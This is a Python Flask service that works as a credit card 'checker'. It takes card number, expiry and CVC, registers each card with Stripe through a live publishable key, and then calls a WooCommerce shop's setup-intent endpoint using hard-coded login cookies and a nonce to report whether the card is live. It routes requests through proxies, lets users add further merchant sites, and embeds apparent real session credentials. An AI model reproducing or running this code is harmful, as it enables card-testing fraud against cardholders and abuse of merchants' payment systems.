from flask import Flask, request, jsonify
import requests
import json
import time

app = Flask(__name__)

SITES_CONFIG = {
    'wulibike.com': {
        'stripe_key': 'pk_live_51IOZZwAYzSkyzldrPSI6CHZvuMZMzmdaFmrMbIhqoiKpD0LcsLcG1AoPHLxC3u0HJaiRxFPca1sACfNE7gzLNASp00GmVNSkPL',
        'cookies': {
            'wordpress_sec_8b6755a93dfd76ea1ca543d76a74f062': 'simran6945%7C1762662718%7ClR4paEUbX9NrodPkKcEuH1fFGtFDKj1kTbhwGRPQSU9%7Cc9fda54789f23e3c9181040a5170aeb71fb93df977838eab181b22d44c3f4e9e',
            'wordpress_logged_in_8b6755a93dfd76ea1ca543d76a74f062': 'simran6945%7C1762662718%7ClR4paEUbX9NrodPkKcEuH1fFGtFDKj1kTbhwGRPQSU9%7Cc1a98a2951278d725f67e5005a024e4b5311ea8a7c180e6fba7ea6872a9ad938',
            '__stripe_mid': '80adf712-fa93-441a-8b77-0d64c2589d350eedce',
            '__stripe_sid': '99d5b8c8-bb77-40a9-874a-43ea82f4e469f5582b',
        },
        'nonce': '94c29b5457',
        'ajax_url': 'https://www.wulibike.com/wp-admin/admin-ajax.php'
    }
}

def parse_proxy(proxy_string):
    if not proxy_string:
        return None
    
    try:
        parts = proxy_string.split(':')
        
        if len(parts) == 2:
            return {
                'http': f'http://{parts[0]}:{parts[1]}',
                'https': f'http://{parts[0]}:{parts[1]}'
            }
        elif len(parts) == 4:
            if '@' in proxy_string or parts[0].replace('.', '').isdigit():
                return {
                    'http': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}',
                    'https': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
                }
            else:
                return {
                    'http': f'http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}',
                    'https': f'http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}'
                }
        else:
            return None
    except:
        return None

def mask_payment_id(pm_id):
    if pm_id and len(pm_id) > 4:
        return '****' + pm_id[-4:]
    return pm_id

def check_stripe_card(site_config, cc, mm, yy, cvc, proxy=None):
    start_time = time.time()
    try:
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en-IN;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        stripe_data = f'type=card&card[number]={cc.replace(" ", "+")}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=US&payment_user_agent=stripe.js%2F0366a8cf46%3B+stripe-js-v3%2F0366a8cf46%3B+payment-element%3B+deferred-intent&key={site_config["stripe_key"]}&_stripe_version=2024-06-20'
        
        proxies = parse_proxy(proxy) if proxy else None
        
        response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers,
            data=stripe_data,
            proxies=proxies,
            timeout=30
        )
        
        result = response.json()
        
        if 'error' in result:
            error_code = result['error'].get('code', 'unknown')
            error_message = result['error'].get('message', 'Card validation failed')
            decline_code = result['error'].get('decline_code', '')
            
            if error_code == 'card_declined':
                if decline_code == 'live_mode_test_card':
                    return {
                        'response': 'Failed',
                        'status': 'Declined',
                        'message': 'Test card in live mode',
                        'code': error_code,
                        'decline_code': decline_code,
                        'time_taken': f'{time.time() - start_time:.2f}s',
                        'Dev': '@teamlegendno1'
                    }
                else:
                    return {
                        'response': 'Failed',
                        'status': 'Declined',
                        'message': error_message,
                        'code': error_code,
                        'decline_code': decline_code,
                        'time_taken': f'{time.time() - start_time:.2f}s',
                        'Dev': '@teamlegendno1'
                    }
            elif error_code in ['incorrect_number', 'invalid_number', 'invalid_expiry_month', 'invalid_expiry_year', 'invalid_cvc']:
                return {
                    'response': 'Failed',
                    'status': 'Invalid',
                    'message': error_message,
                    'code': error_code,
                    'time_taken': f'{time.time() - start_time:.2f}s',
                    'Dev': '@teamlegendno1'
                }
            else:
                return {
                    'response': 'Failed',
                    'status': 'Error',
                    'message': error_message,
                    'code': error_code,
                    'time_taken': f'{time.time() - start_time:.2f}s',
                    'Dev': '@teamlegendno1'
                }
        
        if 'id' in result:
            payment_method_id = result['id']
            
            headers_site = {
                'accept': '*/*',
                'accept-language': 'en-US,en-IN;q=0.9,en;q=0.8',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }
            
            data = {
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': payment_method_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': site_config['nonce'],
            }
            
            proxies = parse_proxy(proxy) if proxy else None
            
            site_response = requests.post(
                site_config['ajax_url'],
                cookies=site_config['cookies'],
                headers=headers_site,
                data=data,
                proxies=proxies,
                timeout=30
            )
            
            try:
                site_result = site_response.json()
            except:
                site_result = {'error': 'Invalid response from site'}
            
            if isinstance(site_result, dict):
                if site_result.get('success') == True:
                    return {
                        'response': 'Succeeded',
                        'status': 'Approved',
                        'message': 'Payment method added successfully',
                        'payment_method': mask_payment_id(payment_method_id),
                        'card_brand': result.get('card', {}).get('brand', 'unknown'),
                        'card_last4': result.get('card', {}).get('last4', '****'),
                        'time_taken': f'{time.time() - start_time:.2f}s',
                        'Dev': '@teamlegendno1'
                    }
                else:
                    error_msg = 'Unknown error'
                    if 'data' in site_result and 'error' in site_result['data']:
                        if isinstance(site_result['data']['error'], dict):
                            error_msg = site_result['data']['error'].get('message', error_msg)
                        else:
                            error_msg = str(site_result['data']['error'])
                    elif 'error' in site_result:
                        if isinstance(site_result['error'], dict):
                            error_msg = site_result['error'].get('message', error_msg)
                        else:
                            error_msg = str(site_result['error'])
                    
                    return {
                        'response': 'Failed',
                        'status': 'Declined',
                        'message': error_msg,
                        'payment_method': mask_payment_id(payment_method_id),
                        'card_brand': result.get('card', {}).get('brand', 'unknown'),
                        'card_last4': result.get('card', {}).get('last4', '****'),
                        'time_taken': f'{time.time() - start_time:.2f}s',
                        'Dev': '@teamlegendno1'
                    }
            
            return {
                'response': 'Succeeded',
                'status': 'CVV Match',
                'message': 'Card validated by Stripe',
                'payment_method': mask_payment_id(payment_method_id),
                'card_brand': result.get('card', {}).get('brand', 'unknown'),
                'card_last4': result.get('card', {}).get('last4', '****'),
                'time_taken': f'{time.time() - start_time:.2f}s',
                'Dev': '@teamlegendno1'
            }
        
        return {
            'response': 'Failed',
            'status': 'Error',
            'message': 'Unknown response from Stripe',
            'time_taken': f'{time.time() - start_time:.2f}s',
            'Dev': '@teamlegendno1'
        }
        
    except requests.exceptions.Timeout:
        return {
            'response': 'Failed',
            'status': 'Timeout',
            'message': 'Request timed out',
            'time_taken': f'{time.time() - start_time:.2f}s',
            'Dev': '@teamlegendno1'
        }
    except Exception as e:
        return {
            'response': 'Failed',
            'status': 'Error',
            'message': str(e),
            'time_taken': f'{time.time() - start_time:.2f}s',
            'Dev': '@teamlegendno1'
        }

@app.route('/')
def check_card():
    site = request.args.get('site', '')
    cc_data = request.args.get('cc', '')
    proxy = request.args.get('proxy', '')
    
    if not site:
        return jsonify({
            'response': 'Failed',
            'status': 'Error',
            'message': 'Site parameter required. Format: ?site=wulibike.com&cc=cc|mm|yy|cvc&proxy=ip:port'
        }), 400
    
    if not cc_data:
        return jsonify({
            'response': 'Failed',
            'status': 'Error',
            'message': 'Card data required. Format: ?site=wulibike.com&cc=cc|mm|yy|cvc&proxy=ip:port'
        }), 400
    
    if site not in SITES_CONFIG:
        return jsonify({
            'response': 'Failed',
            'status': 'Error',
            'message': f'Site not configured. Available sites: {", ".join(SITES_CONFIG.keys())}'
        }), 400
    
    try:
        parts = cc_data.split('|')
        if len(parts) != 4:
            return jsonify({
                'response': 'Failed',
                'status': 'Error',
                'message': 'Invalid card format. Use: cc|mm|yy|cvc'
            }), 400
        
        cc, mm, yy, cvc = parts
        
        result = check_stripe_card(SITES_CONFIG[site], cc, mm, yy, cvc, proxy)
        return jsonify(result)
        
    except Exception as e:
        return jsonify({
            'response': 'Failed',
            'status': 'Error',
            'message': str(e)
        }), 500

@app.route('/add-site', methods=['POST'])
def add_site():
    try:
        data = request.get_json()
        site_name = data.get('site')
        stripe_key = data.get('stripe_key')
        ajax_url = data.get('ajax_url')
        nonce = data.get('nonce')
        cookies = data.get('cookies', {})
        
        if not all([site_name, stripe_key, ajax_url, nonce]):
            return jsonify({
                'response': 'Failed',
                'status': 'Error',
                'message': 'Required fields: site, stripe_key, ajax_url, nonce'
            }), 400
        
        SITES_CONFIG[site_name] = {
            'stripe_key': stripe_key,
            'cookies': cookies,
            'nonce': nonce,
            'ajax_url': ajax_url
        }
        
        return jsonify({
            'response': 'Succeeded',
            'status': 'Added',
            'message': f'Site {site_name} added successfully'
        })
        
    except Exception as e:
        return jsonify({
            'response': 'Failed',
            'status': 'Error',
            'message': str(e)
        }), 500

@app.route('/sites')
def list_sites():
    return jsonify({
        'sites': list(SITES_CONFIG.keys()),
        'total': len(SITES_CONFIG)
    })

if __name__ == '__main__':
    import os
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, debug=False)
